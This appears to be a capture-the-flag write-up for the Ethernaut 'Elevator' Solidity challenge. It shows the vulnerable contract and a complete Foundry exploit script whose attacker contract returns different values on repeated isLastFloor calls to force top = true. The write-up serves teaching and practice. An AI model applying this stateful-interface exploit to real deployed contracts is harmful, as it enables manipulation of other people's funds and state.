---
title: "Elevator"
date: 2026-01-08T00:00:00+00:00
draft: false
author: "Koyphshi"
description: "Exploiting a malicious Building interface to set top = true"
categories: ["Blockchain"]
tags: ["ethernaut", "solidity", "interface", "view-purity"]
math: true
code:
  maxShownLines: 50
toc:
  enable: true
  auto: true
---

in this challenge our goal is to set `top = True`

<!--more-->

{{< admonition type="info" title="Challenge Info" open="true" >}}
- **Platform**: Ethernaut
- **Challenge**: Elevator
- **Category**: Blockchain
{{< /admonition >}}

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Elevator.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract player {
  Elevator elv ;
  bool public isCalled;

  constructor(Elevator _elv){
    elv = _elv;
    isCalled = false;
  }
  function isLastFloor(uint256) external returns (bool) {
    if (!isCalled) {
      isCalled = true;
      return false;
    }
    return true;
  }
  function pwn() external {
    elv.goTo(5);
  }

}



contract Solver is Script {
  Elevator instance = Elevator(0x10D1844cAe2C522EF51396873a55e14fEE689C60);
  function run() external {
     vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
     player p = new player(instance);
     p.pwn();
     console.log(instance.top());
  }

}
